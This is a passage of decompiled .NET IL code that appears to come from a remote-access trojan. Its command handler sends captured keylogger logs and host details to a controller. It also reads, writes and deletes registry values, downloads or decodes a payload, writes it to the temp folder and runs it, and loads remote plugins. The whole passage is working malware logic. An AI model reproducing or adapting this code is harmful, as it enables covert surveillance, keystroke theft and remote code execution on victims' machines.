      IL_0922:  callvirt   instance class [mscorlib]System.IO.StreamWriter [System]System.Diagnostics.Process::get_StandardInput()
      IL_0927:  ldloc.0
      IL_0928:  ldc.i4.1
      IL_0929:  ldelema    [mscorlib]System.String
      IL_092e:  call       string ClassLibrary1.OK::DEB(string&)
      IL_0933:  callvirt   instance void [mscorlib]System.IO.TextWriter::WriteLine(string)
      IL_0938:  leave      IL_16cc

      IL_093d:  ldloc.s    V_58
      IL_093f:  ldstr      "rsc"
      IL_0944:  ldc.i4.0
      IL_0945:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_094a:  ldc.i4.0
      IL_094b:  bne.un.s   IL_0973

      .try
      {
        IL_094d:  ldsfld     class [System]System.Diagnostics.Process ClassLibrary1.OK::Pro
        IL_0952:  callvirt   instance void [System]System.Diagnostics.Process::Kill()
        IL_0957:  leave.s    IL_0968

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_0959:  dup
        IL_095a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_095f:  stloc.s    V_26
        IL_0961:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0966:  leave.s    IL_0968

      }  // end handler
      IL_0968:  ldnull
      IL_0969:  stsfld     class [System]System.Diagnostics.Process ClassLibrary1.OK::Pro
      IL_096e:  leave      IL_16cc

      IL_0973:  ldloc.s    V_58
      IL_0975:  ldstr      "kl"
      IL_097a:  ldc.i4.0
      IL_097b:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0980:  ldc.i4.0
      IL_0981:  bne.un.s   IL_09ac

      IL_0983:  ldstr      "kl"
      IL_0988:  ldsfld     string ClassLibrary1.OK::Y
      IL_098d:  ldsfld     class ClassLibrary1.kl ClassLibrary1.OK::kq
      IL_0992:  ldflda     string ClassLibrary1.kl::Logs
      IL_0997:  call       string ClassLibrary1.OK::ENB(string&)
      IL_099c:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_09a1:  call       bool ClassLibrary1.OK::Send(string)
      IL_09a6:  pop
      IL_09a7:  leave      IL_16cc

      IL_09ac:  ldloc.s    V_58
      IL_09ae:  ldstr      "inf"
      IL_09b3:  ldc.i4.0
      IL_09b4:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_09b9:  ldc.i4.0
      IL_09ba:  bne.un     IL_0ad4

      IL_09bf:  ldstr      "inf"
      IL_09c4:  ldsfld     string ClassLibrary1.OK::Y
      IL_09c9:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_09ce:  stloc.s    V_27
      IL_09d0:  ldstr      "vn"
      IL_09d5:  call       string ClassLibrary1.OK::GTV(string)
      IL_09da:  ldstr      ""
      IL_09df:  ldc.i4.0
      IL_09e0:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_09e5:  ldc.i4.0
      IL_09e6:  bne.un.s   IL_0a1a

      IL_09e8:  ldloc.s    V_27
      IL_09ea:  ldsflda    string ClassLibrary1.OK::VN
      IL_09ef:  call       string ClassLibrary1.OK::DEB(string&)
      IL_09f4:  ldstr      "_"
      IL_09f9:  call       string ClassLibrary1.OK::HWD()
      IL_09fe:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0a03:  stloc.s    V_63
      IL_0a05:  ldloca.s   V_63
      IL_0a07:  call       string ClassLibrary1.OK::ENB(string&)
      IL_0a0c:  ldsfld     string ClassLibrary1.OK::Y
      IL_0a11:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0a16:  stloc.s    V_27
      IL_0a18:  br.s       IL_0a53

      IL_0a1a:  ldloc.s    V_27
      IL_0a1c:  ldstr      "vn"
      IL_0a21:  call       string ClassLibrary1.OK::GTV(string)
      IL_0a26:  stloc.s    V_63
      IL_0a28:  ldloca.s   V_63
      IL_0a2a:  call       string ClassLibrary1.OK::DEB(string&)
      IL_0a2f:  ldstr      "_"
      IL_0a34:  call       string ClassLibrary1.OK::HWD()
      IL_0a39:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0a3e:  stloc.s    V_69
      IL_0a40:  ldloca.s   V_69
      IL_0a42:  call       string ClassLibrary1.OK::ENB(string&)
      IL_0a47:  ldsfld     string ClassLibrary1.OK::Y
      IL_0a4c:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0a51:  stloc.s    V_27
      IL_0a53:  ldc.i4.5
      IL_0a54:  newarr     [mscorlib]System.String
      IL_0a59:  stloc.s    V_60
      IL_0a5b:  ldloc.s    V_60
      IL_0a5d:  ldc.i4.0
      IL_0a5e:  ldloc.s    V_27
      IL_0a60:  stelem.ref
      IL_0a61:  ldloc.s    V_60
      IL_0a63:  ldc.i4.1
      IL_0a64:  ldsfld     string ClassLibrary1.OK::H
      IL_0a69:  stelem.ref
      IL_0a6a:  ldloc.s    V_60
      IL_0a6c:  ldc.i4.2
      IL_0a6d:  ldstr      ":"
      IL_0a72:  stelem.ref
      IL_0a73:  ldloc.s    V_60
      IL_0a75:  ldc.i4.3
      IL_0a76:  ldsfld     string ClassLibrary1.OK::P
      IL_0a7b:  stelem.ref
      IL_0a7c:  ldloc.s    V_60
      IL_0a7e:  ldc.i4.4
      IL_0a7f:  ldsfld     string ClassLibrary1.OK::Y
      IL_0a84:  stelem.ref
      IL_0a85:  ldloc.s    V_60
      IL_0a87:  call       string [mscorlib]System.String::Concat(string[])
      IL_0a8c:  stloc.s    V_27
      IL_0a8e:  ldloc.s    V_27
      IL_0a90:  ldsfld     string ClassLibrary1.OK::DR
      IL_0a95:  ldsfld     string ClassLibrary1.OK::Y
      IL_0a9a:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0a9f:  stloc.s    V_27
      IL_0aa1:  ldloc.s    V_27
      IL_0aa3:  ldsfld     string ClassLibrary1.OK::EXE
      IL_0aa8:  ldsfld     string ClassLibrary1.OK::Y
      IL_0aad:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0ab2:  stloc.s    V_27
      IL_0ab4:  ldloc.s    V_27
      IL_0ab6:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::GetCurrentProcess()
      IL_0abb:  callvirt   instance string [System]System.Diagnostics.Process::get_ProcessName()
      IL_0ac0:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0ac5:  stloc.s    V_27
      IL_0ac7:  ldloc.s    V_27
      IL_0ac9:  call       bool ClassLibrary1.OK::Send(string)
      IL_0ace:  pop
      IL_0acf:  leave      IL_16cc

      IL_0ad4:  ldloc.s    V_58
      IL_0ad6:  ldstr      "prof"
      IL_0adb:  ldc.i4.0
      IL_0adc:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0ae1:  ldc.i4.0
      IL_0ae2:  bne.un     IL_0b91

      IL_0ae7:  ldloc.0
      IL_0ae8:  ldc.i4.1
      IL_0ae9:  ldelem.ref
      IL_0aea:  stloc.s    V_70
      IL_0aec:  ldloc.s    V_70
      IL_0aee:  ldstr      "~"
      IL_0af3:  ldc.i4.0
      IL_0af4:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0af9:  ldc.i4.0
      IL_0afa:  bne.un.s   IL_0b0d

      IL_0afc:  ldloc.0
      IL_0afd:  ldc.i4.2
      IL_0afe:  ldelem.ref
      IL_0aff:  ldloc.0
      IL_0b00:  ldc.i4.3
      IL_0b01:  ldelem.ref
      IL_0b02:  call       object ClassLibrary1.OK::STV(string,
                                                        string)
      IL_0b07:  pop
      IL_0b08:  leave      IL_16cc

      IL_0b0d:  ldloc.s    V_70
      IL_0b0f:  ldstr      "!"
      IL_0b14:  ldc.i4.0
      IL_0b15:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0b1a:  ldc.i4.0
      IL_0b1b:  bne.un.s   IL_0b71

      IL_0b1d:  ldloc.0
      IL_0b1e:  ldc.i4.2
      IL_0b1f:  ldelem.ref
      IL_0b20:  ldloc.0
      IL_0b21:  ldc.i4.3
      IL_0b22:  ldelem.ref
      IL_0b23:  call       object ClassLibrary1.OK::STV(string,
                                                        string)
      IL_0b28:  pop
      IL_0b29:  ldc.i4.5
      IL_0b2a:  newarr     [mscorlib]System.String
      IL_0b2f:  stloc.s    V_60
      IL_0b31:  ldloc.s    V_60
      IL_0b33:  ldc.i4.0
      IL_0b34:  ldstr      "getvalue"
      IL_0b39:  stelem.ref
      IL_0b3a:  ldloc.s    V_60
      IL_0b3c:  ldc.i4.1
      IL_0b3d:  ldsfld     string ClassLibrary1.OK::Y
      IL_0b42:  stelem.ref
      IL_0b43:  ldloc.s    V_60
      IL_0b45:  ldc.i4.2
      IL_0b46:  ldloc.0
      IL_0b47:  ldc.i4.1
      IL_0b48:  ldelem.ref
      IL_0b49:  stelem.ref
      IL_0b4a:  ldloc.s    V_60
      IL_0b4c:  ldc.i4.3
      IL_0b4d:  ldsfld     string ClassLibrary1.OK::Y
      IL_0b52:  stelem.ref
      IL_0b53:  ldloc.s    V_60
      IL_0b55:  ldc.i4.4
      IL_0b56:  ldloc.0
      IL_0b57:  ldc.i4.1
      IL_0b58:  ldelem.ref
      IL_0b59:  call       string ClassLibrary1.OK::GTV(string)
      IL_0b5e:  stelem.ref
      IL_0b5f:  ldloc.s    V_60
      IL_0b61:  call       string [mscorlib]System.String::Concat(string[])
      IL_0b66:  call       bool ClassLibrary1.OK::Send(string)
      IL_0b6b:  pop
      IL_0b6c:  leave      IL_16cc

      IL_0b71:  ldloc.s    V_70
      IL_0b73:  ldstr      "@"
      IL_0b78:  ldc.i4.0
      IL_0b79:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0b7e:  ldc.i4.0
      IL_0b7f:  bne.un     IL_1668

      IL_0b84:  ldloc.0
      IL_0b85:  ldc.i4.2
      IL_0b86:  ldelem.ref
      IL_0b87:  call       void ClassLibrary1.OK::DLV(string)
      IL_0b8c:  leave      IL_16cc

      IL_0b91:  ldloc.s    V_58
      IL_0b93:  ldstr      "rn"
      IL_0b98:  ldc.i4.0
      IL_0b99:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0b9e:  ldc.i4.0
      IL_0b9f:  bne.un     IL_0ce1

      IL_0ba4:  ldnull
      IL_0ba5:  stloc.s    V_28
      IL_0ba7:  ldloc.0
      IL_0ba8:  ldc.i4.2
      IL_0ba9:  ldelem.ref
      IL_0baa:  callvirt   instance string [mscorlib]System.String::ToLower()
      IL_0baf:  ldstr      "http"
      IL_0bb4:  callvirt   instance bool [mscorlib]System.String::StartsWith(string)
      IL_0bb9:  brtrue.s   IL_0c0b

      .try
      {
        IL_0bbb:  ldloc.0
        IL_0bbc:  ldc.i4.2
        IL_0bbd:  ldelem.ref
        IL_0bbe:  call       uint8[] [mscorlib]System.Convert::FromBase64String(string)
        IL_0bc3:  ldc.i4.0
        IL_0bc4:  stloc.s    V_71
        IL_0bc6:  ldloca.s   V_71
        IL_0bc8:  call       uint8[] ClassLibrary1.OK::ZIP(uint8[],
                                                           bool&)
        IL_0bcd:  stloc.s    V_28
        IL_0bcf:  leave      IL_0c57

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_0bd4:  dup
        IL_0bd5:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0bda:  stloc.s    V_30
        IL_0bdc:  ldstr      "MSG"
        IL_0be1:  ldsfld     string ClassLibrary1.OK::Y
        IL_0be6:  ldstr      "Execute ERROR"
        IL_0beb:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_0bf0:  call       bool ClassLibrary1.OK::Send(string)
        IL_0bf5:  pop
        IL_0bf6:  ldstr      "bla"
        IL_0bfb:  call       bool ClassLibrary1.OK::Send(string)
        IL_0c00:  pop
        IL_0c01:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0c06:  leave      IL_16cc

      }  // end handler
      IL_0c0b:  newobj     instance void [System]System.Net.WebClient::.ctor()
      IL_0c10:  stloc.s    V_31
      .try
      {
        IL_0c12:  ldloc.s    V_31
        IL_0c14:  ldloc.0
        IL_0c15:  ldc.i4.2
        IL_0c16:  ldelem.ref
        IL_0c17:  callvirt   instance uint8[] [System]System.Net.WebClient::DownloadData(string)
        IL_0c1c:  stloc.s    V_28
        IL_0c1e:  leave.s    IL_0c57

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_0c20:  dup
        IL_0c21:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0c26:  stloc.s    V_32
        IL_0c28:  ldstr      "MSG"
        IL_0c2d:  ldsfld     string ClassLibrary1.OK::Y
        IL_0c32:  ldstr      "Download ERROR"
        IL_0c37:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_0c3c:  call       bool ClassLibrary1.OK::Send(string)
        IL_0c41:  pop
        IL_0c42:  ldstr      "bla"
        IL_0c47:  call       bool ClassLibrary1.OK::Send(string)
        IL_0c4c:  pop
        IL_0c4d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0c52:  leave      IL_16cc

      }  // end handler
      IL_0c57:  ldstr      "bla"
      IL_0c5c:  call       bool ClassLibrary1.OK::Send(string)
      IL_0c61:  pop
      IL_0c62:  ldc.i4.5
      IL_0c63:  newarr     [mscorlib]System.String
      IL_0c68:  stloc.s    V_60
      IL_0c6a:  ldloc.s    V_60
      IL_0c6c:  ldc.i4.0
      IL_0c6d:  ldstr      "temp"
      IL_0c72:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
      IL_0c77:  stelem.ref
      IL_0c78:  ldloc.s    V_60
      IL_0c7a:  ldc.i4.1
      IL_0c7b:  ldstr      "\\"
      IL_0c80:  stelem.ref
      IL_0c81:  ldloc.s    V_60
      IL_0c83:  ldc.i4.2
      IL_0c84:  ldc.i4.s   10
      IL_0c86:  call       string ClassLibrary1.OK::RN(int32)
      IL_0c8b:  stelem.ref
      IL_0c8c:  ldloc.s    V_60
      IL_0c8e:  ldc.i4.3
      IL_0c8f:  ldstr      "."
      IL_0c94:  stelem.ref
      IL_0c95:  ldloc.s    V_60
      IL_0c97:  ldc.i4.4
      IL_0c98:  ldloc.0
      IL_0c99:  ldc.i4.1
      IL_0c9a:  ldelem.ref
      IL_0c9b:  stelem.ref
      IL_0c9c:  ldloc.s    V_60
      IL_0c9e:  call       string [mscorlib]System.String::Concat(string[])
      IL_0ca3:  stloc.s    V_29
      IL_0ca5:  ldloc.s    V_29
      IL_0ca7:  ldloc.s    V_28
      IL_0ca9:  call       void [mscorlib]System.IO.File::WriteAllBytes(string,
                                                                        uint8[])
      IL_0cae:  ldloc.s    V_29
      IL_0cb0:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::Start(string)
      IL_0cb5:  pop
      IL_0cb6:  ldstr      "MSG"
      IL_0cbb:  ldsfld     string ClassLibrary1.OK::Y
      IL_0cc0:  ldstr      "Executed As "
      IL_0cc5:  ldloc.s    V_29
      IL_0cc7:  newobj     instance void [mscorlib]System.IO.FileInfo::.ctor(string)
      IL_0ccc:  callvirt   instance string [mscorlib]System.IO.FileInfo::get_Name()
      IL_0cd1:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string,
                                                                  string)
      IL_0cd6:  call       bool ClassLibrary1.OK::Send(string)
      IL_0cdb:  pop
      IL_0cdc:  leave      IL_16cc

      IL_0ce1:  ldloc.s    V_58
      IL_0ce3:  ldstr      "inv"
      IL_0ce8:  ldc.i4.0
      IL_0ce9:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0cee:  ldc.i4.0
      IL_0cef:  bne.un     IL_0f17

      IL_0cf4:  ldstr      "bla"
      IL_0cf9:  call       bool ClassLibrary1.OK::Send(string)
      IL_0cfe:  pop
      IL_0cff:  ldloc.0
      IL_0d00:  ldc.i4.1
      IL_0d01:  ldelem.ref
      IL_0d02:  call       string ClassLibrary1.OK::GTV(string)
      IL_0d07:  stloc.s    V_35
      IL_0d09:  ldloc.s    V_35
      IL_0d0b:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_0d10:  ldc.i4.0
      IL_0d11:  ble.s      IL_0d62

      IL_0d13:  ldloc.s    V_35
      IL_0d15:  call       uint8[] [mscorlib]System.Convert::FromBase64String(string)
      IL_0d1a:  stloc.s    V_33
      IL_0d1c:  ldc.i4.5
      IL_0d1d:  newarr     [mscorlib]System.String
      IL_0d22:  stloc.s    V_60
      IL_0d24:  ldloc.s    V_60
      IL_0d26:  ldc.i4.0
      IL_0d27:  ldstr      "pl"
      IL_0d2c:  stelem.ref
      IL_0d2d:  ldloc.s    V_60
      IL_0d2f:  ldc.i4.1
      IL_0d30:  ldsfld     string ClassLibrary1.OK::Y
      IL_0d35:  stelem.ref
      IL_0d36:  ldloc.s    V_60
      IL_0d38:  ldc.i4.2
      IL_0d39:  ldloc.0
      IL_0d3a:  ldc.i4.1
      IL_0d3b:  ldelem.ref
      IL_0d3c:  stelem.ref
      IL_0d3d:  ldloc.s    V_60
      IL_0d3f:  ldc.i4.3
      IL_0d40:  ldsfld     string ClassLibrary1.OK::Y
      IL_0d45:  stelem.ref
      IL_0d46:  ldloc.s    V_60
      IL_0d48:  ldc.i4.4
      IL_0d49:  ldc.i4.0
      IL_0d4a:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(int32)
      IL_0d4f:  stelem.ref
      IL_0d50:  ldloc.s    V_60
      IL_0d52:  call       string [mscorlib]System.String::Concat(string[])
      IL_0d57:  call       bool ClassLibrary1.OK::Send(string)
      IL_0d5c:  pop
      IL_0d5d:  br         IL_0e1d

      IL_0d62:  ldloc.0
      IL_0d63:  ldc.i4.3
      IL_0d64:  ldelem.ref
      IL_0d65:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_0d6a:  ldc.i4.1
      IL_0d6b:  bne.un.s   IL_0db2

      IL_0d6d:  ldc.i4.5
      IL_0d6e:  newarr     [mscorlib]System.String
      IL_0d73:  stloc.s    V_60
      IL_0d75:  ldloc.s    V_60
      IL_0d77:  ldc.i4.0
      IL_0d78:  ldstr      "pl"
      IL_0d7d:  stelem.ref
      IL_0d7e:  ldloc.s    V_60
      IL_0d80:  ldc.i4.1
      IL_0d81:  ldsfld     string ClassLibrary1.OK::Y
      IL_0d86:  stelem.ref
      IL_0d87:  ldloc.s    V_60
      IL_0d89:  ldc.i4.2
      IL_0d8a:  ldloc.0
      IL_0d8b:  ldc.i4.1
      IL_0d8c:  ldelem.ref
      IL_0d8d:  stelem.ref
      IL_0d8e:  ldloc.s    V_60
      IL_0d90:  ldc.i4.3
      IL_0d91:  ldsfld     string ClassLibrary1.OK::Y
      IL_0d96:  stelem.ref
      IL_0d97:  ldloc.s    V_60
      IL_0d99:  ldc.i4.4
      IL_0d9a:  ldstr      "False"
      IL_0d9f:  stelem.ref
      IL_0da0:  ldloc.s    V_60
      IL_0da2:  call       string [mscorlib]System.String::Concat(string[])
      IL_0da7:  call       bool ClassLibrary1.OK::Send(string)
      IL_0dac:  pop
      IL_0dad:  leave      IL_16cc

      IL_0db2:  ldloc.0
      IL_0db3:  ldc.i4.3
      IL_0db4:  ldelem.ref
      IL_0db5:  call       uint8[] [mscorlib]System.Convert::FromBase64String(string)
      IL_0dba:  ldc.i4.0
      IL_0dbb:  stloc.s    V_71
      IL_0dbd:  ldloca.s   V_71
      IL_0dbf:  call       uint8[] ClassLibrary1.OK::ZIP(uint8[],
                                                         bool&)
      IL_0dc4:  stloc.s    V_33
      IL_0dc6:  ldloc.0
      IL_0dc7:  ldc.i4.1
      IL_0dc8:  ldelem.ref
      IL_0dc9:  ldloc.s    V_33
      IL_0dcb:  call       string [mscorlib]System.Convert::ToBase64String(uint8[])
      IL_0dd0:  call       object ClassLibrary1.OK::STV(string,
                                                        string)
      IL_0dd5:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(object)
      IL_0dda:  brfalse.s  IL_0e1d

      IL_0ddc:  ldc.i4.5
      IL_0ddd:  newarr     [mscorlib]System.String
      IL_0de2:  stloc.s    V_60
      IL_0de4:  ldloc.s    V_60
      IL_0de6:  ldc.i4.0
      IL_0de7:  ldstr      "pl"
      IL_0dec:  stelem.ref
      IL_0ded:  ldloc.s    V_60
      IL_0def:  ldc.i4.1
      IL_0df0:  ldsfld     string ClassLibrary1.OK::Y
      IL_0df5:  stelem.ref
      IL_0df6:  ldloc.s    V_60
      IL_0df8:  ldc.i4.2
      IL_0df9:  ldloc.0
      IL_0dfa:  ldc.i4.1
      IL_0dfb:  ldelem.ref
      IL_0dfc:  stelem.ref
      IL_0dfd:  ldloc.s    V_60
      IL_0dff:  ldc.i4.3
      IL_0e00:  ldsfld     string ClassLibrary1.OK::Y
      IL_0e05:  stelem.ref
      IL_0e06:  ldloc.s    V_60
      IL_0e08:  ldc.i4.4
      IL_0e09:  ldc.i4.0
      IL_0e0a:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(int32)
      IL_0e0f:  stelem.ref
      IL_0e10:  ldloc.s    V_60
      IL_0e12:  call       string [mscorlib]System.String::Concat(string[])
      IL_0e17:  call       bool ClassLibrary1.OK::Send(string)
      IL_0e1c:  pop
      IL_0e1d:  ldloc.s    V_33
      IL_0e1f:  ldstr      "A"
      IL_0e24:  call       object ClassLibrary1.OK::Plugin(uint8[],
                                                           string)
      IL_0e29:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0e2e:  stloc.s    V_34
      IL_0e30:  ldloc.s    V_34
      IL_0e32:  ldnull
      IL_0e33:  ldstr      "h"
      IL_0e38:  ldc.i4.1
      IL_0e39:  newarr     [mscorlib]System.Object
      IL_0e3e:  stloc.s    V_72
      IL_0e40:  ldloc.s    V_72
      IL_0e42:  ldc.i4.0
      IL_0e43:  ldsfld     string ClassLibrary1.OK::H
      IL_0e48:  stelem.ref
      IL_0e49:  ldloc.s    V_72
      IL_0e4b:  ldnull
      IL_0e4c:  ldnull
      IL_0e4d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                      class [mscorlib]System.Type,
                                                                                                                      string,
                                                                                                                      object[],
                                                                                                                      string[],
                                                                                                                      class [mscorlib]System.Type[])
      IL_0e52:  ldloc.s    V_34
      IL_0e54:  ldnull
      IL_0e55:  ldstr      "p"
      IL_0e5a:  ldc.i4.1
      IL_0e5b:  newarr     [mscorlib]System.Object
      IL_0e60:  stloc.s    V_72
      IL_0e62:  ldloc.s    V_72
      IL_0e64:  ldc.i4.0
      IL_0e65:  ldsfld     string ClassLibrary1.OK::P
      IL_0e6a:  stelem.ref
      IL_0e6b:  ldloc.s    V_72
      IL_0e6d:  ldnull
      IL_0e6e:  ldnull
      IL_0e6f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                      class [mscorlib]System.Type,
                                                                                                                      string,
                                                                                                                      object[],
                                                                                                                      string[],
                                                                                                                      class [mscorlib]System.Type[])
      IL_0e74:  ldloc.s    V_34
      IL_0e76:  ldnull
      IL_0e77:  ldstr      "osk"
      IL_0e7c:  ldc.i4.1
      IL_0e7d:  newarr     [mscorlib]System.Object
      IL_0e82:  stloc.s    V_72
      IL_0e84:  ldloc.s    V_72
      IL_0e86:  ldc.i4.0
      IL_0e87:  ldloc.0
      IL_0e88:  ldc.i4.2
      IL_0e89:  ldelem.ref
      IL_0e8a:  stelem.ref
      IL_0e8b:  ldloc.s    V_72
      IL_0e8d:  ldnull
      IL_0e8e:  ldnull
      IL_0e8f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                      class [mscorlib]System.Type,
                                                                                                                      string,
                                                                                                                      object[],
                                                                                                                      string[],
                                                                                                                      class [mscorlib]System.Type[])
      IL_0e94:  ldloc.s    V_34
      IL_0e96:  ldnull
      IL_0e97:  ldstr      "start"
      IL_0e9c:  ldc.i4.0
      IL_0e9d:  newarr     [mscorlib]System.Object
      IL_0ea2:  ldnull
      IL_0ea3:  ldnull
      IL_0ea4:  ldnull
      IL_0ea5:  ldc.i4.1
      IL_0ea6:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateCall(object,
                                                                                                                         class [mscorlib]System.Type,
                                                                                                                         string,
                                                                                                                         object[],
                                                                                                                         string[],
                                                                                                                         class [mscorlib]System.Type[],
                                                                                                                         bool[],
                                                                                                                         bool)
      IL_0eab:  pop
      IL_0eac:  br.s       IL_0eb4

      IL_0eae:  ldc.i4.1
      IL_0eaf:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
      IL_0eb4:  ldsfld     bool ClassLibrary1.OK::Cn
      IL_0eb9:  ldc.i4.0
      IL_0eba:  ceq
      IL_0ebc:  box        [mscorlib]System.Boolean
      IL_0ec1:  ldloc.s    V_34
      IL_0ec3:  ldnull
      IL_0ec4:  ldstr      "Off"
      IL_0ec9:  ldc.i4.0
      IL_0eca:  newarr     [mscorlib]System.Object
      IL_0ecf:  ldnull
      IL_0ed0:  ldnull
      IL_0ed1:  ldnull
      IL_0ed2:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateGet(object,
                                                                                                                        class [mscorlib]System.Type,
                                                                                                                        string,
                                                                                                                        object[],
                                                                                                                        string[],
                                                                                                                        class [mscorlib]System.Type[],
                                                                                                                        bool[])
      IL_0ed7:  ldc.i4.1
      IL_0ed8:  box        [mscorlib]System.Boolean
      IL_0edd:  ldc.i4.0
      IL_0ede:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareObjectEqual(object,
                                                                                                                              object,
                                                                                                                              bool)
      IL_0ee3:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::OrObject(object,
                                                                                                                    object)
      IL_0ee8:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(object)
      IL_0eed:  brfalse.s  IL_0eae

      IL_0eef:  ldloc.s    V_34
      IL_0ef1:  ldnull
      IL_0ef2:  ldstr      "off"
      IL_0ef7:  ldc.i4.1
      IL_0ef8:  newarr     [mscorlib]System.Object
      IL_0efd:  stloc.s    V_72
      IL_0eff:  ldloc.s    V_72
      IL_0f01:  ldc.i4.0
      IL_0f02:  ldc.i4.1
      IL_0f03:  box        [mscorlib]System.Boolean
      IL_0f08:  stelem.ref
      IL_0f09:  ldloc.s    V_72
      IL_0f0b:  ldnull
      IL_0f0c:  ldnull
      IL_0f0d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                      class [mscorlib]System.Type,
                                                                                                                      string,
                                                                                                                      object[],
                                                                                                                      string[],
                                                                                                                      class [mscorlib]System.Type[])
      IL_0f12:  leave      IL_16cc

      IL_0f17:  ldloc.s    V_58
      IL_0f19:  ldstr      "ret"
      IL_0f1e:  ldc.i4.0
      IL_0f1f:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0f24:  ldc.i4.0
      IL_0f25:  bne.un     IL_10ca

      IL_0f2a:  ldstr      "bla"
      IL_0f2f:  call       bool ClassLibrary1.OK::Send(string)
      IL_0f34:  pop
      IL_0f35:  ldloc.0
      IL_0f36:  ldc.i4.1
      IL_0f37:  ldelem.ref
      IL_0f38:  call       string ClassLibrary1.OK::GTV(string)
      IL_0f3d:  stloc.s    V_38
      IL_0f3f:  ldloc.s    V_38
      IL_0f41:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_0f46:  ldc.i4.0
      IL_0f47:  ble.s      IL_0f98

      IL_0f49:  ldloc.s    V_38
      IL_0f4b:  call       uint8[] [mscorlib]System.Convert::FromBase64String(string)
      IL_0f50:  stloc.s    V_36
      IL_0f52:  ldc.i4.5
      IL_0f53:  newarr     [mscorlib]System.String
      IL_0f58:  stloc.s    V_60
      IL_0f5a:  ldloc.s    V_60
      IL_0f5c:  ldc.i4.0
      IL_0f5d:  ldstr      "pl"
      IL_0f62:  stelem.ref
